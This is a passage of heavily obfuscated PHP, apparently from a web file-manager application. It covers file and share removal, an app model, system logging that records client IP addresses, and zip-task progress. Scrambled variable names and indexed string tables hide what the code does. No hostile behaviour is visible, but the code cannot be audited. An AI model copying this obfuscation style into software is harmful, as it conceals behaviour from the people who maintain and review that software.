$ŠÏ¢ ëï[2202] => $ŠÏ¢ ëï[620], $ŠÏ¢ ëï[32] => $îÓ©­Š[$ŠÏ¢ ëï[32]], $ŠÏ¢ ëï[1283] => $îÓ©­Š); Hook::trigger($ŠÏ¢ ëï[1775], array($ŠÏ¢ ëï[1283] => $°˜Û°‡¨, $ŠÏ¢ ëï[1293] => !0)); show_json($ÆÙş¾ÜØ, !1, 100111); } if ($ŠëŠìË² == $ŠÏ¢ ëï[620]) { return !0; } if ($ÚßüØ¼¿ || $Ã×Âú·) { $Ÿõô±Ú€ = array_merge($ÚßüØ¼¿, $Ã×Âú·); $Ÿõô±Ú€ = array_filter(array_unique($Ÿõô±Ú€)); $this->removeByFileID($Ÿõô±Ú€); } if ($Â—¶Å²ö) { $Â—¶Å²ö = array_filter(array_unique($Â—¶Å²ö)); foreach ($Â—¶Å²ö as $áŠŒğ¾“) { $¸ƒ’Òç = IO::has($áŠŒğ¾“, !0); if (!$¸ƒ’Òç[$ŠÏ¢ ëï[239]] && !$¸ƒ’Òç[$ŠÏ¢ ëï[240]]) { IO::remove($áŠŒğ¾“); } } } return $this->remove($úÙ°Åı); } private function removeByFileID($ÚÎÌµ³İ = array()) { $Ì©˜ô¿­ =& $_SERVER[Ş­ğŠìÒ]; if (empty($ÚÎÌµ³İ)) { return; } $‡Ö«Ğñ = array($Ì©˜ô¿­[541] => array($Ì©˜ô¿­[7], $ÚÎÌµ³İ)); $’À“‹ş˜ = Model($Ì©˜ô¿­[1414])->where($‡Ö«Ğñ)->field($Ì©˜ô¿­[193])->select(); if (!$’À“‹ş˜) { return Model($Ì©˜ô¿­[544])->remove($ÚÎÌµ³İ); } $’À“‹ş˜ = array_to_keyvalue($’À“‹ş˜, $Ì©˜ô¿­[12], $Ì©˜ô¿­[193]); foreach ($’À“‹ş˜ as $À¥•¾¢—) { Model($Ì©˜ô¿­[891])->removeNow($À¥•¾¢—, !1); } } private function removeShareItems($¬æı”º) { $ †…ô¾ =& $_SERVER[Ş­ğŠìÒ]; $É¯şÖ‰ı = "\173\x69\157\72{$¬æı”º}\175\57"; $Û›óöÀ’ = array($ †…ô¾[193] => 0, $ †…ô¾[1253] => array($ †…ô¾[459], "{$É¯şÖ‰ı}\45")); $ğÑÔÛğ— = Model($ †…ô¾[1942])->where($Û›óöÀ’)->field($ †…ô¾[665])->select(); if (empty($ğÑÔÛğ—)) { return; } $¼£§ÛÃµ = array_to_keyvalue($ğÑÔÛğ—, $ †…ô¾[12], $ †…ô¾[665]); Model($ †…ô¾[664])->remove($¼£§ÛÃµ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\114\x69\x67\150\164\x41\x70\160"; public $modelType = "\123\171\163\164\x65\x6d\x4f\160\x74\151\x6f\156"; public $field = array("\x6e\141\x6d\145", "\147\162\157\165\160", "\x64\145\163\143", "\x63\157\x6e\x74\x65\156\x74"); public function listData($ìÈœÚÀÏ = false, $’­øüáà = "\x6d\x6f\144\x69\x66\171\x54\151\155\x65", $ÕˆŸíî = true) { return parent::listData($ìÈœÚÀÏ, $’­øüáà, $ÕˆŸíî); } public function remove($œ¹å†Àˆ) { $ûÂ€½ŠØ = $this->findByName($œ¹å†Àˆ); if (!$ûÂ€½ŠØ) { return !1; } return parent::remove($ûÂ€½ŠØ[$_SERVER[Ş­ğŠìÒ][475]]); } public function add($ƒÀ¼Ÿà†) { if ($this->findByName($ƒÀ¼Ÿà†[$_SERVER[Ş­ğŠìÒ][32]])) { return !1; } return parent::insert($ƒÀ¼Ÿà†); } public function update($ ­ÚŞåû, $ƒù½ÁÍ’) { $ÂşåÚå£ =& $_SERVER[Ş­ğŠìÒ]; $Ü—Œïº¤ = $this->findByName($ ­ÚŞåû); $ç›ÊÙÖ¿ = $this->findByName($ƒù½ÁÍ’[$ÂşåÚå£[32]]); if (!$Ü—Œïº¤ || $ç›ÊÙÖ¿ && $ç›ÊÙÖ¿[$ÂşåÚå£[475]] != $Ü—Œïº¤[$ÂşåÚå£[475]]) { return !1; } return parent::update($Ü—Œïº¤[$ÂşåÚå£[475]], $ƒù½ÁÍ’); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\145\x6d\x5f\154\x6f\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\124\151\155\145", "\164\x69\155\x65", "\151\x6e\163\x65\x72\x74", "\x66\165\156\143\164\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ûŞ§ğñ =& $_SERVER[Ş­ğŠìÒ]; return array($ûŞ§ğñ[2325] => LNG($ûŞ§ğñ[2326]), $ûŞ§ğñ[2327] => LNG($ûŞ§ğñ[2328]), $ûŞ§ğñ[1905] => LNG($ûŞ§ğñ[2329]), $ûŞ§ğñ[2330] => LNG($ûŞ§ğñ[2331]), $ûŞ§ğñ[2332] => LNG($ûŞ§ğñ[2333]), $ûŞ§ğñ[2334] => LNG($ûŞ§ğñ[2335]), $ûŞ§ğñ[2336] => LNG($ûŞ§ğñ[2337]), $ûŞ§ğñ[1935] => LNG($ûŞ§ğñ[2337]), $ûŞ§ğñ[1936] => LNG($ûŞ§ğñ[2338]), $ûŞ§ğñ[2339] => LNG($ûŞ§ğñ[2340]), $ûŞ§ğñ[2341] => LNG($ûŞ§ğñ[2342]), $ûŞ§ğñ[2343] => LNG($ûŞ§ğñ[2344]), $ûŞ§ğñ[2345] => LNG($ûŞ§ğñ[2346]), $ûŞ§ğñ[1933] => LNG($ûŞ§ğñ[2347]), $ûŞ§ğñ[2348] => LNG($ûŞ§ğñ[2349]), $ûŞ§ğñ[1940] => LNG($ûŞ§ğñ[2350]), $ûŞ§ğñ[2351] => LNG($ûŞ§ğñ[2352]), $ûŞ§ğñ[2353] => LNG($ûŞ§ğñ[2354]), $ûŞ§ğñ[2355] => LNG($ûŞ§ğñ[2356]), $ûŞ§ğñ[2357] => LNG($ûŞ§ğñ[2358]), $ûŞ§ğñ[1943] => LNG($ûŞ§ğñ[2359]), $ûŞ§ğñ[1944] => LNG($ûŞ§ğñ[2360]), $ûŞ§ğñ[2361] => LNG($ûŞ§ğñ[2362]), $ûŞ§ğñ[2363] => LNG($ûŞ§ğñ[2364]), $ûŞ§ğñ[2365] => LNG($ûŞ§ğñ[2366]), $ûŞ§ğñ[1938] => LNG($ûŞ§ğñ[2367]), $ûŞ§ğñ[2368] => LNG($ûŞ§ğñ[2369]), $ûŞ§ğñ[1937] => LNG($ûŞ§ğñ[2370]), $ûŞ§ğñ[2371] => LNG($ûŞ§ğñ[2372]), $ûŞ§ğñ[2373] => LNG($ûŞ§ğñ[2374]), $ûŞ§ğñ[2375] => LNG($ûŞ§ğñ[2374]), $ûŞ§ğñ[2376] => LNG($ûŞ§ğñ[2377]), $ûŞ§ğñ[2378] => LNG($ûŞ§ğñ[2378]), $ûŞ§ğñ[2379] => LNG($ûŞ§ğñ[1909]), $ûŞ§ğñ[2380] => LNG($ûŞ§ğñ[2381]), $ûŞ§ğñ[2382] => LNG($ûŞ§ğñ[2383]), $ûŞ§ğñ[2384] => LNG($ûŞ§ğñ[2385]), $ûŞ§ğñ[2386] => LNG($ûŞ§ğñ[2387]), $ûŞ§ğñ[2388] => LNG($ûŞ§ğñ[2389]), $ûŞ§ğñ[2390] => LNG($ûŞ§ğñ[2390]), $ûŞ§ğñ[2391] => LNG($ûŞ§ğñ[2392]), $ûŞ§ğñ[2393] => LNG($ûŞ§ğñ[2394]), $ûŞ§ğñ[2395] => LNG($ûŞ§ğñ[2396]), $ûŞ§ğñ[2397] => LNG($ûŞ§ğñ[2398]), $ûŞ§ğñ[2399] => LNG($ûŞ§ğñ[2400]), $ûŞ§ğñ[2401] => LNG($ûŞ§ğñ[2402]), $ûŞ§ğñ[212] => LNG($ûŞ§ğñ[212]), $ûŞ§ğñ[213] => LNG($ûŞ§ğñ[2403]), $ûŞ§ğñ[2404] => LNG($ûŞ§ğñ[2404])); } private function typeFile() { $§Ö¢ÊÌÒ =& $_SERVER[Ş­ğŠìÒ]; $îÖçü‚š = array($§Ö¢ÊÌÒ[1940] => array($§Ö¢ÊÌÒ[1941]), $§Ö¢ÊÌÒ[2343] => array($§Ö¢ÊÌÒ[2405]), $§Ö¢ÊÌÒ[2345] => array($§Ö¢ÊÌÒ[2406]), $§Ö¢ÊÌÒ[1933] => array($§Ö¢ÊÌÒ[1934], $§Ö¢ÊÌÒ[2407]), $§Ö¢ÊÌÒ[2353] => array(), $§Ö¢ÊÌÒ[2355] => array(), $§Ö¢ÊÌÒ[2357] => array(), $§Ö¢ÊÌÒ[1943] => array($§Ö¢ÊÌÒ[1945]), $§Ö¢ÊÌÒ[1944] => array($§Ö¢ÊÌÒ[1945]), $§Ö¢ÊÌÒ[2361] => array($§Ö¢ÊÌÒ[2408]), $§Ö¢ÊÌÒ[2363] => array($§Ö¢ÊÌÒ[2408]), $§Ö¢ÊÌÒ[2365] => array($§Ö¢ÊÌÒ[2409]), $§Ö¢ÊÌÒ[2351] => array($§Ö¢ÊÌÒ[2410]), $§Ö¢ÊÌÒ[1938] => array($§Ö¢ÊÌÒ[2411]), $§Ö¢ÊÌÒ[2368] => array($§Ö¢ÊÌÒ[2412]), $§Ö¢ÊÌÒ[1937] => array($§Ö¢ÊÌÒ[1939])); return $îÖçü‚š; } private function typeAll() { $Ãèç÷¾Û =& $_SERVER[Ş­ğŠìÒ]; $àúİæŸŒ = $this->typeList; $Íé¨–ıÁ = array_filter($this->typeFile()); foreach ($Íé¨–ıÁ as $˜üÖ©’È => $Œ÷ĞÈÃÉ) { $àúİæŸŒ[$Œ÷ĞÈÃÉ[0]] = $àúİæŸŒ[$˜üÖ©’È]; } $àúİæŸŒ[$Ãèç÷¾Û[1945]] = LNG($Ãèç÷¾Û[2413]); $àúİæŸŒ[$Ãèç÷¾Û[2408]] = LNG($Ãèç÷¾Û[2414]); return $àúİæŸŒ; } public function addLog($ïÄé†£—, $Ğ‰³€ÕÑ = array()) { $¨ù’¢æ =& $_SERVER[Ş­ğŠìÒ]; if (!isset($this->typeList[$ïÄé†£—])) { return; } $ƒ¨Å¿è¨ = Session::get($¨ù’¢æ[2105]); if (!$ƒ¨Å¿è¨) { $ƒ¨Å¿è¨ = _get($Ğ‰³€ÕÑ, $¨ù’¢æ[1764], 0); } if ($ïÄé†£— == $¨ù’¢æ[2380] && is_array($Ğ‰³€ÕÑ[$¨ù’¢æ[2415]]) && !$Ğ‰³€ÕÑ[$¨ù’¢æ[2415]]) { return; } $ıà¿®—÷ = get_client_ip(); if (!$Ğ‰³€ÕÑ || strlen(json_encode($Ğ‰³€ÕÑ)) >= 1024 * 64) { if ($Ğ‰³€ÕÑ && is_array($Ğ‰³€ÕÑ)) { $Ğ‰³€ÕÑ = array_intersect_key($Ğ‰³€ÕÑ, array_flip($¨ù’¢æ[475], $¨ù’¢æ[32])); $Ğ‰³€ÕÑ[$¨ù’¢æ[2416]] = $ıà¿®—÷; } else { $Ğ‰³€ÕÑ = array($¨ù’¢æ[2416] => $ıà¿®—÷); } } else { if (is_array($Ğ‰³€ÕÑ)) { $Ğ‰³€ÕÑ[$¨ù’¢æ[2416]] = $ıà¿®—÷; } else { $Ğ‰³€ÕÑ = array($¨ù’¢æ[1283] => $Ğ‰³€ÕÑ, $¨ù’¢æ[2416] => $ıà¿®—÷); } } $Ğ‰³€ÕÑ = array($¨ù’¢æ[1754] => Session::sign(), $¨ù’¢æ[1755] => intval($ƒ¨Å¿è¨), $¨ù’¢æ[33] => $ïÄé†£—, $¨ù’¢æ[1757] => json_encode($Ğ‰³€ÕÑ)); parent::add($Ğ‰³€ÕÑ); } public function remove($·¦Œ° ¿) { $this->where(array($_SERVER[Ş­ğŠìÒ][493] => $·¦Œ° ¿))->delete(); } private function _makeOrder($ÕŠ“İÚÇ = '') { $¸•Ú„± =& $_SERVER[Ş­ğŠìÒ]; $ÉÇ¸í³ = $¸•Ú„±[231]; $©Ş¥Â”‹ = array($¸•Ú„±[523] => $¸•Ú„±[524], $¸•Ú„±[525] => $¸•Ú„±[526]); $Ş¨½„“ø = Input::get($¸•Ú„±[531], $¸•Ú„±[7], $¸•Ú„±[2141], array($¸•Ú„±[2059], $¸•Ú„±[525])); $Ş¨½„“ø = $©Ş¥Â”‹[$Ş¨½„“ø]; $ÕŠ“İÚÇ = $ÕŠ“İÚÇ . "{$ÉÇ¸í³}\x20{$Ş¨½„“ø}"; return $this->order($ÕŠ“İÚÇ); } public function get($©ğ÷Ù = '') { $©Ü‰İÌ× =& $_SERVER[Ş­ğŠìÒ]; if (!$©ğ÷Ù) { show_json(array()); } $İ¢áÛÄ’ = array(); if ($©ğ÷Ù[$©Ü‰İÌ×[1764]]) { $İ¢áÛÄ’[$©Ü‰İÌ×[1764]] = $©ğ÷Ù[$©Ü‰İÌ×[1764]]; } if (isset($©ğ÷Ù[$©Ü‰İÌ×[827]])) { $®Õªñš– = $©ğ÷Ù[$©Ü‰İÌ×[827]]; $Û‚Íğ© = isset($©ğ÷Ù[$©Ü‰İÌ×[828]]) ? $©ğ÷Ù[$©Ü‰İÌ×[828]] : time(); $İ¢áÛÄ’[$©Ü‰İÌ×[231]] = array($©Ü‰İÌ×[409], array($®Õªñš–, $Û‚Íğ©)); } if ($©ğ÷Ù[$©Ü‰İÌ×[33]]) { $´Ç»‰®ğ = explode($©Ü‰İÌ×[50], $©ğ÷Ù[$©Ü‰İÌ×[33]]); $°šà¬›— = $this->typeFile(); $÷õÁÏï´ = array(); foreach ($´Ç»‰®ğ as $€³œ·Ÿ) { $÷õÁÏï´[] = $€³œ·Ÿ; if (isset($°šà¬›—[$€³œ·Ÿ])) { $÷õÁÏï´ = array_merge($÷õÁÏï´, $°šà¬›—[$€³œ·Ÿ]); } } $÷õÁÏï´ = array_unique($÷õÁÏï´); if ($÷õÁÏï´) { $İ¢áÛÄ’[$©Ü‰İÌ×[33]] = array($©Ü‰İÌ×[7], $÷õÁÏï´); } } else { $İ¢áÛÄ’[$©Ü‰İÌ×[33]] = array($©Ü‰İÌ×[2417], $©Ü‰İÌ×[2418]); } if (!empty($©ğ÷Ù[$©Ü‰İÌ×[2416]])) { $İ¢áÛÄ’[$©Ü‰İÌ×[526]] = array($©Ü‰İÌ×[459], "\45{$©ğ÷Ù[$©Ü‰İÌ×[2416]]}\45"); } $š’øÃ‰ = $this->_makeOrder()->where($İ¢áÛÄ’)->selectPage(); if (empty($š’øÃ‰[$©Ü‰İÌ×[445]])) { show_json(array(), !0, $š’øÃ‰[$©Ü‰İÌ×[442]]); } $š’øÃ‰[$©Ü‰İÌ×[445]] = $this->logList($š’øÃ‰[$©Ü‰İÌ×[445]]); return $š’øÃ‰; } private function ipAddress(&$ğÃõÑòó) { $öˆÙèÃš =& $_SERVER[Ş­ğŠìÒ]; if (!empty($ğÃõÑòó[$öˆÙèÃš[2416]])) { $Øø¹Ø¯â = IpLocation::get($ğÃõÑòó[$öˆÙèÃš[2416]]); } else { $Øø¹Ø¯â = LNG($öˆÙèÃš[2419]); } $ğÃõÑòó[$öˆÙèÃš[2420]] = $Øø¹Ø¯â; } private function descZipDownload($Ñô£‘–, &$©È¿»©ñ) { $¤û…®Ë =& $_SERVER[Ş­ğŠìÒ]; if (!isset($Ñô£‘–[$¤û…®Ë[2421]])) { return; } $ Ã¼´ĞÜ = json_decode($Ñô£‘–[$¤û…®Ë[2421]], !0); foreach ($ Ã¼´ĞÜ as $¡™™’•î) { try { $°†¬¶ıø = IO::infoFullSimple($¡™™’•î[$¤û…®Ë[87]]); } catch (Exception $ÇÊñÂ) { continue; } $Ñô£‘–[$¤û…®Ë[87]] = $¡™™’•î[$¤û…®Ë[87]]; $©È¿»©ñ[] = $Ñô£‘–[$¤û…®Ë[193]] = $°†¬¶ıø[$¤û…®Ë[193]]; $©È¿»©ñ[] = $Ñô£‘–[$¤û…®Ë[2197]] = $°†¬¶ıø[$¤û…®Ë[192]]; break; } return $Ñô£‘–; } private function getSourceList(&$€·ğğ¡) { $Á·ó†¸Ë =& $_SERVER[Ş­ğŠìÒ]; $ã˜‹š† = array(); foreach ($€·ğğ¡ as $ƒîî¹‘ => $ôëÌ¯×¸) { $ùÙ“›‚– = json_decode($ôëÌ¯×¸[$Á·ó†¸Ë[526]], !0); if ($ôëÌ¯×¸[$Á·ó†¸Ë[33]] == $Á·ó†¸Ë[1936]) { $ùÙ“›‚– = $this->descZipDownload($ùÙ“›‚–, $ã˜‹š†); $€·ğğ¡[$ƒîî¹‘][$Á·ó†¸Ë[526]] = json_encode($ùÙ“›‚–); continue; } if (strpos($ôëÌ¯×¸[$Á·ó†¸Ë[33]], $Á·ó†¸Ë[2199]) !== 0) { if (!isset($ùÙ“›‚–[$Á·ó†¸Ë[87]]) || strpos($ôëÌ¯×¸[$Á·ó†¸Ë[33]], $Á·ó†¸Ë[2422]) !== 0) { continue; } try { $Â¼Õ›é = IO::infoFullSimple($ùÙ“›‚–[$Á·ó†¸Ë[87]]); } catch (Exception $™±ù’ø­) { continue; } $ã˜‹š†[] = $ùÙ“›‚–[$Á·ó†¸Ë[193]] = $Â¼Õ›é[$Á·ó†¸Ë[193]]; $ã˜‹š†[] = $ùÙ“›‚–[$Á·ó†¸Ë[2197]] = $Â¼Õ›é[$Á·ó†¸Ë[192]]; $€·ğğ¡[$ƒîî¹‘][$Á·ó†¸Ë[526]] = json_encode($ùÙ“›‚–); continue; } $ã˜‹š†[] = $ùÙ“›‚–[$Á·ó†¸Ë[193]]; $ã˜‹š†[] = $ùÙ“›‚–[$Á·ó†¸Ë[2197]]; if ($ùÙ“›‚–[$Á·ó†¸Ë[33]] == $Á·ó†¸Ë[620]) { $ã˜‹š†[] = $ùÙ“›‚–[$Á·ó†¸Ë[526]][$Á·ó†¸Ë[1237]]; $ã˜‹š†[] = $ùÙ“›‚–[$Á·ó†¸Ë[526]][$Á·ó†¸Ë[1238]]; } if ($ùÙ“›‚–[$Á·ó†¸Ë[33]] == $Á·ó†¸Ë[2208]) { $ã˜‹š†[] = $ùÙ“›‚–[$Á·ó†¸Ë[526]][$Á·ó†¸Ë[193]]; } } if (!$ã˜‹š†) { return array(); } return Model($Á·ó†¸Ë[891])->sourceListInfo($ã˜‹š†, !0); } private function logList($Û±¤«µä) { $³ÇÓ¶ÁÁ =& $_SERVER[Ş­ğŠìÒ]; $ÚÏù½² = array_to_keyvalue($Û±¤«µä, $³ÇÓ¶ÁÁ[12], $³ÇÓ¶ÁÁ[1764]); $×¥çÜçü = Model($³ÇÓ¶ÁÁ[598])->userListInfo(array_unique($ÚÏù½²)); $ğ‘Ö« = $this->getSourceList($Û±¤«µä); $µÀÏè½¶ = $this->typeAll(); $¹×à·â = array(); $¼‘ªåø = array(); foreach ($Û±¤«µä as $ÀÚî–¸„ => $Ñê¸àÏÁ) { $šØ ‰èŠ = $Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[33]]; $ÄšËø = isset($×¥çÜçü[$Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[1764]]]) ? $×¥çÜçü[$Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[1764]]] : !1; $âùÁ†´± = strpos($šØ ‰èŠ, $³ÇÓ¶ÁÁ[2423]) === 0 ? LNG($³ÇÓ¶ÁÁ[2424]) : LNG($³ÇÓ¶ÁÁ[2419]); $Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[32]] = isset($ÄšËø[$³ÇÓ¶ÁÁ[32]]) ? $ÄšËø[$³ÇÓ¶ÁÁ[32]] : LNG($³ÇÓ¶ÁÁ[2419]); $Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[2252]] = isset($ÄšËø[$³ÇÓ¶ÁÁ[2252]]) ? $ÄšËø[$³ÇÓ¶ÁÁ[2252]] : $³ÇÓ¶ÁÁ[12]; $Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[1653]] = isset($µÀÏè½¶[$šØ ‰èŠ]) ? $µÀÏè½¶[$šØ ‰èŠ] : $âùÁ†´±; $Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[2140]] = $ÄšËø; $Î¥ÛËö¸ = json_decode($Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[526]], !0); $Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[2416]] = isset($Î¥ÛËö¸[$³ÇÓ¶ÁÁ[2416]]) ? $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[2416]] : $³ÇÓ¶ÁÁ[12]; $Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[2420]] = IpLocation::get($Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[2416]]); if (strpos($šØ ‰èŠ, $³ÇÓ¶ÁÁ[2199]) === 0 || isset($Î¥ÛËö¸[$³ÇÓ¶ÁÁ[2197]])) { $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[90]] = $ğ‘Ö«[$Î¥ÛËö¸[$³ÇÓ¶ÁÁ[193]]]; $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[2213]] = $ğ‘Ö«[$Î¥ÛËö¸[$³ÇÓ¶ÁÁ[2197]]]; if ($Î¥ÛËö¸[$³ÇÓ¶ÁÁ[33]] == $³ÇÓ¶ÁÁ[620]) { $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[526]][$³ÇÓ¶ÁÁ[1237]] = $ğ‘Ö«[$Î¥ÛËö¸[$³ÇÓ¶ÁÁ[526]][$³ÇÓ¶ÁÁ[1237]]]; $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[526]][$³ÇÓ¶ÁÁ[1238]] = $ğ‘Ö«[$Î¥ÛËö¸[$³ÇÓ¶ÁÁ[526]][$³ÇÓ¶ÁÁ[1238]]]; } if ($Î¥ÛËö¸[$³ÇÓ¶ÁÁ[33]] == $³ÇÓ¶ÁÁ[2208]) { $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[526]][$³ÇÓ¶ÁÁ[193]] = $ğ‘Ö«[$Î¥ÛËö¸[$³ÇÓ¶ÁÁ[526]][$³ÇÓ¶ÁÁ[193]]]; } if ($Î¥ÛËö¸[$³ÇÓ¶ÁÁ[33]] == $³ÇÓ¶ÁÁ[1931]) { $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[2213]] = $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[90]]; $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[2197]] = $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[2213]][$³ÇÓ¶ÁÁ[193]]; $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[90]] = !1; $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[193]] = $³ÇÓ¶ÁÁ[12]; } $ÛÃƒ—†€ = array($³ÇÓ¶ÁÁ[1931], $³ÇÓ¶ÁÁ[2195]); if (!in_array($Î¥ÛËö¸[$³ÇÓ¶ÁÁ[33]], $ÛÃƒ—†€)) { if ($Î¥ÛËö¸[$³ÇÓ¶ÁÁ[90]] && $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[90]][$³ÇÓ¶ÁÁ[190]] == $³ÇÓ¶ÁÁ[191]) { $¼‘ªåø[] = $Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[475]]; unset($Û±¤«µä[$ÀÚî–¸„]); continue; } if ($Î¥ÛËö¸[$³ÇÓ¶ÁÁ[2213]] && $Î¥ÛËö¸[$³ÇÓ¶ÁÁ[2213]][$³ÇÓ¶ÁÁ[190]] == $³ÇÓ¶ÁÁ[191]) { $¼‘ªåø[] = $Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[475]]; unset($Û±¤«µä[$ÀÚî–¸„]); continue; } } } $Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[526]] = $Î¥ÛËö¸; unset($Ñê¸àÏÁ[$³ÇÓ¶ÁÁ[2425]]); $¹×à·â[] = $Ñê¸àÏÁ; } $this->clearSystemPathLog($¼‘ªåø); return $¹×à·â; } private function clearSystemPathLog($–˜•’«) { $üÁ—‚íù =& $_SERVER[Ş­ğŠìÒ]; if (count($–˜•’«) == 0) { return; } $ÉÚÍëò = array($üÁ—‚íù[475] => array($üÁ—‚íù[7], array_unique($–˜•’«))); $this->where($ÉÚÍëò)->delete(); } public function deviceList($—Œ¾ÌÒ÷, $¿£‡½—È = 0) { $¥öÃ ø =& $_SERVER[Ş­ğŠìÒ]; $‘§É€Œé = array($¥öÃ ø[1764] => $—Œ¾ÌÒ÷, $¥öÃ ø[231] => array($¥öÃ ø[1088], $¿£‡½—È), $¥öÃ ø[33] => $¥öÃ ø[1905]); $•Ş÷¨¯Æ = array(); $ŞôéşÄÜ = $this->field($¥öÃ ø[2426])->where($‘§É€Œé)->order($¥öÃ ø[2211])->limit(50)->select(); foreach ($ŞôéşÄÜ as $Ñü›ˆ¾ä => $¼»ÍØî®) { if ($Ñü›ˆ¾ä > 0 && abs($¼»ÍØî®[$¥öÃ ø[231]] - $ŞôéşÄÜ[$Ñü›ˆ¾ä - 1][$¥öÃ ø[231]]) < 5) { continue; } $¾ÄÏ¨… = json_decode($¼»ÍØî®[$¥öÃ ø[526]], !0); $¼»ÍØî®[$¥öÃ ø[2416]] = isset($¾ÄÏ¨…[$¥öÃ ø[2416]]) ? $¾ÄÏ¨…[$¥öÃ ø[2416]] : $¥öÃ ø[12]; unset($¾ÄÏ¨…[$¥öÃ ø[2416]]); $ª—Ç–º = $this->deviceType($¾ÄÏ¨…[$¥öÃ ø[2200]]); if (isset($•Ş÷¨¯Æ[$ª—Ç–º])) { continue; } $¼»ÍØî®[$¥öÃ ø[2420]] = IpLocation::get($¼»ÍØî®[$¥öÃ ø[2416]]); $¼»ÍØî®[$¥öÃ ø[526]] = $¾ÄÏ¨…; $•Ş÷¨¯Æ[$ª—Ç–º] = $¼»ÍØî®; } return array_values($•Ş÷¨¯Æ); } public function deviceType($Ê±˜×©) { return $Ê±˜×©; } } goto Dê ¢»Ü; fí¿ù†±ñ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $À•¸¾öî =& $_SERVER[Ş­ğŠìÒ]; parent::startAfter(); Hook::bind($À•¸¾öî[1888], array($this, $À•¸¾öî[1878])); Hook::bind($À•¸¾öî[1880], array($this, $À•¸¾öî[1881])); $Ë¬œ«à =& $this->task; $Ë¬œ«à[$À•¸¾öî[1882]] = $À•¸¾öî[1275]; if (!$Ë¬œ«à[$À•¸¾öî[1653]]) { $Ë¬œ«à[$À•¸¾öî[1653]] = LNG($À•¸¾öî[1889]); } } protected function endAfter() { $‰ô²ïó… =& $_SERVER[Ş­ğŠìÒ]; parent::endAfter(); Hook::unbind($‰ô²ïó…[1888], array($this, $‰ô²ïó…[1878])); Hook::unbind($‰ô²ïó…[1880], array($this, $‰ô²ïó…[1881])); } public function updateAfter() { $šÉÎ˜‹ =& $_SERVER[Ş­ğŠìÒ]; $ Ğ²ëé§ =& $this->task; if (!$ Ğ²ëé§[$šÉÎ˜‹[1137]] || !$ Ğ²ëé§[$šÉÎ˜‹[830]]) { return; } if ($ Ğ²ëé§[$šÉÎ˜‹[1882]] == $šÉÎ˜‹[1275]) { $ıÇ¾Ã×” = $ Ğ²ëé§[$šÉÎ˜‹[1818]]; if ($ Ğ²ëé§[$šÉÎ˜‹[1819]] != $šÉÎ˜‹[1275]) { $ıÇ¾Ã×” = 0; } $À‚İì½ = ($ Ğ²ëé§[$šÉÎ˜‹[1822]] + $ıÇ¾Ã×”) / $ Ğ²ëé§[$šÉÎ˜‹[830]]; $ Ğ²ëé§[$šÉÎ˜‹[1766]] = $À‚İì½ * 0.3; } else { if ($ Ğ²ëé§[$šÉÎ˜‹[1882]] == $šÉÎ˜‹[389]) { $À‚İì½ = $ Ğ²ëé§[$šÉÎ˜‹[1765]] / $ Ğ²ëé§[$šÉÎ˜‹[1137]]; $ Ğ²ëé§[$šÉÎ˜‹[1766]] = 0.3 + $À‚İì½ * 0.5; } else { if ($ Ğ²ëé§[$šÉÎ˜‹[1882]] == $šÉÎ˜‹[110]) { $À‚İì½ = 0; if ($ Ğ²ëé§[$šÉÎ˜‹[1817]]) { $À‚İì½ = $ Ğ²ëé§[$šÉÎ˜‹[1818]] / $ Ğ²ëé§[$šÉÎ˜‹[1817]]; } $ Ğ²ëé§[$šÉÎ˜‹[1766]] = 0.3 + 0.5 + $À‚İì½ * 0.2; } } } if ($ Ğ²ëé§[$šÉÎ˜‹[1766]] > 0) { $–¿›¤­Ò = timeFloat() - $ Ğ²ëé§[$šÉÎ˜‹[1768]] - $ Ğ²ëé§[$šÉÎ˜‹[1771]]; $ Ğ²ëé§[$šÉÎ˜‹[1772]] = $–¿›¤­Ò * (1 - $ Ğ²ëé§[$šÉÎ˜‹[1766]]) / $ Ğ²ëé§[$šÉÎ˜‹[1766]]; } } public function copyFileStart($áŸÃğø¨, $©È ššÖ, $ô§è¯®ú, $½ê‚œ½ù, $‰Çä¢£Ä, $ŞÉ¼¨™†) { $àÓµœİ =& $_SERVER[Ş­ğŠìÒ]; parent::copyFileStart($áŸÃğø¨, $©È ššÖ, $ô§è¯®ú, $½ê‚œ½ù, $‰Çä¢£Ä, $ŞÉ¼¨™†); $¤¥ò»Óì =& $this->task; if ($¤¥ò»Óì[$àÓµœİ[1882]] == $àÓµœİ[389]) { $¤¥ò»Óì[$àÓµœİ[1882]] = $àÓµœİ[110]; } $this->update(); } public function copyFileEnd($Í”µãÖ, $·ó†»©, $Íš—§Ë¨, $Õ˜ŸıÄ, $¦›•‹›², $Å·¶ñƒ) { $„àãº¹Ö =& $_SERVER[Ş­ğŠìÒ]; $õ­ŠÆ™» =& $this->task; $õ­ŠÆ™»[$„àãº¹Ö[1818]] = $õ­ŠÆ™»[$„àãº¹Ö[1817]]; 